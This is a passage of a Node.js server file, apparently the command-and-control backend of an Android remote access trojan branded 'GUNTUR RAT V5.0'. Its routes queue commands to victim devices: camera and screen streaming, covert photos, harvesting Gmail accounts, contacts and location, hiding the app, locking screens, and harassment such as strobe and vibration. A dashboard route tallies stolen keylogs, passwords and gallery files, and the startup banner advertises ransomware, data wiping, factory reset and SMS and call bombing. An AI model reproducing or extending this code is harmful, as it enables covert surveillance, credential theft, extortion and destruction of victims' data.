    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'start_cam_stream', extra: side, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/stop_cam_stream', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'stop_cam_stream', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/start_screen_stream', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'start_screen_stream', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/stop_screen_stream', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'stop_screen_stream', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

// ==================== FLASHLIGHT COMMANDS ====================
app.get('/api/flashlight_on', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'flashlight_on', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/flashlight_off', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'flashlight_off', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

// ==================== HIDE/SHOW APP ====================
app.get('/api/hide_app', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'hide_app', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/show_app', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'show_app', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

// ==================== SPYWARE SPECIFIC COMMANDS ====================
app.get('/api/spyware/lock', (req, res) => {
    const deviceId = req.query.device;
    const message = req.query.message || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'lock', extra: message, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/unlock', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'unlock', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/flashlight_on', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'flashlight_on', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/flashlight_off', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'flashlight_off', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/app/hide', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'hide_app', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/app/show', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'show_app', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/take_photo', (req, res) => {
    const deviceId = req.query.device;
    const side = req.query.side || 'back';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'take_photo', extra: side, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/get_screen', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'get_screen', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/get_gmails', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'get_gmails', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/set_wallpaper', (req, res) => {
    const deviceId = req.query.device;
    const url = req.query.url || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'set_wallpaper', extra: url, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/music/play', (req, res) => {
    const deviceId = req.query.device;
    const url = req.query.url || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'play_music', extra: url, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/music/stop', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'stop_music', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/get_contacts', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'get_contacts', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/flash_strobe', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'flash_strobe', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/stop_strobe', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'stop_strobe', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/vibrate_loop', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'vibrate_loop', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/openweb', (req, res) => {
    const deviceId = req.query.device;
    const url = req.query.url || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'open_web', extra: url, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/get_location', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'get_location', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/force_open', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'force_open', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/show_notif', (req, res) => {
    const deviceId = req.query.device;
    const title = req.query.title || '';
    const message = req.query.message || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'show_notification', extra: `${title}|${message}`, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/show_popup', (req, res) => {
    const deviceId = req.query.device;
    const title = req.query.title || '';
    const message = req.query.message || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'show_popup', extra: `${title}|${message}`, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/get_battery', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'get_battery', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

app.get('/api/spyware/get_device_info', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== deviceId);
    commands.push({ device_id: deviceId, command: 'get_device_info', extra: '', timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    res.json({ success: true });
});

// ==================== DASHBOARD STATS ====================
app.get('/api/dashboard/stats', (req, res) => {
    const targets = readData(TARGETS_FILE);
    const onlineCount = targets.filter(t => t.status === 'Online').length;
    const gallery = readData(GALLERY_FILE);
    const keylogs = readData(KEYLOG_FILE);
    const passwords = readData(PASSWORD_FILE);
    
    res.json({
        total_targets: targets.length,
        online: onlineCount,
        offline: targets.length - onlineCount,
        total_gallery: gallery.length,
        total_keylogs: keylogs.reduce((sum, k) => sum + (k.logs?.length || 0), 0),
        total_passwords: passwords.length,
        last_update: new Date().toISOString()
    });
});

// ==================== START SERVER ====================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n╔══════════════════════════════════════════════════════════════════╗`);
    console.log(`║                                                                  ║`);
    console.log(`║         🔥 GUNTUR RAT V5.0 - FULL SYSTEM (COMPLETE) 🔥          ║`);
    console.log(`║                                                                  ║`);
    console.log(`║   💀 HARD LOCK    💀 RANSOMWARE    💀 PANIC MODE                 ║`);
    console.log(`║   🦠 VIRUS MODE   📸 GALLERY      🎙️ AUDIO REC                  ║`);
    console.log(`║   ⌨️ KEYLOGGER    🔑 PASSWORDS    📍 LOCATION                    ║`);
    console.log(`║   📷 CAM STREAM   🖥️ SCREEN STREAM 🎵 MEDIA CONTROL              ║`);
    console.log(`║   💣 DESTRUCTIVE  📞 CALL BOMB    📨 SMS BOMBER                  ║`);
    console.log(`║                                                                  ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
    console.log(`║                                                                  ║`);
    console.log(`║   🌐 SERVER RUNNING ON PORT: ${PORT}                                     ║`);
    console.log(`║   📡 STATUS: ONLINE - READY TO COMMAND                           ║`);
    console.log(`║                                                                  ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
    console.log(`║                                                                  ║`);
    console.log(`║   🔗 MAIN API ENDPOINTS:                                         ║`);
    console.log(`║   GET  /api/list-targets     - List semua device                ║`);
    console.log(`║   POST /api/send-command     - Kirim command ke device          ║`);
    console.log(`║   GET  /api/hard_lock        - Lock device                      ║`);
    console.log(`║   GET  /api/unlock           - Unlock device                    ║`);
    console.log(`║   GET  /api/activate_ransomware - Aktifkan ransomware           ║`);
    console.log(`║   GET  /api/panic_mode       - Aktifkan panic mode              ║`);
    console.log(`║   GET  /api/virus_mode       - Aktifkan virus mode              ║`);
    console.log(`║   GET  /api/grab_gallery     - Ambil semua gallery              ║`);
    console.log(`║   GET  /api/start_keylogger  - Mulai keylogger                  ║`);
    console.log(`║   GET  /api/get_saved_passwords - Ambil password                ║`);
    console.log(`║   GET  /api/factory_reset    - Factory reset device             ║`);
    console.log(`║   GET  /api/wipe_data        - Wipe semua data                  ║`);
    console.log(`║   GET  /api/dashboard/stats  - Statistik server                 ║`);
    console.log(`║                                                                  ║`);
    console.log(`╚══════════════════════════════════════════════════════════════════╝\n`);
});